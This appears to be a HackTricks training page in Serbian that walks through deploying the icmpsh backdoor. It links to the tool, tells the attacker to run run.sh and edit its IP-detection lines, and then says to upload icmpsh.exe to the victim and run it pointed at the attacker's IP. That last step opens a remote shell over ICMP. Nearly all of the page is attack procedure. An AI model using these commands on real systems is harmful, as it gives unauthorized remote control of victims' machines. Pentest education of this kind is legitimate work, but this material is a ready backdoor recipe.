{{#include ../banners/hacktricks-training.md}}

Preuzmite backdoor sa: [https://github.com/inquisb/icmpsh](https://github.com/inquisb/icmpsh)

# Klijentska strana

Izvršite skriptu: **run.sh**

**Ako dobijete neku grešku, pokušajte da promenite linije:**
```bash
IPINT=$(ifconfig | grep "eth" | cut -d " " -f 1 | head -1)
IP=$(ifconfig "$IPINT" |grep "inet addr:" |cut -d ":" -f 2 |awk '{ print $1 }')
```
**Za:**
```bash
echo Please insert the IP where you want to listen
read IP
```
# **Strana žrtve**

Otpremite **icmpsh.exe** na žrtvu i izvršite:
```bash
icmpsh.exe -t <Attacker-IP> -d 500 -b 30 -s 128
```
{{#include ../banners/hacktricks-training.md}}
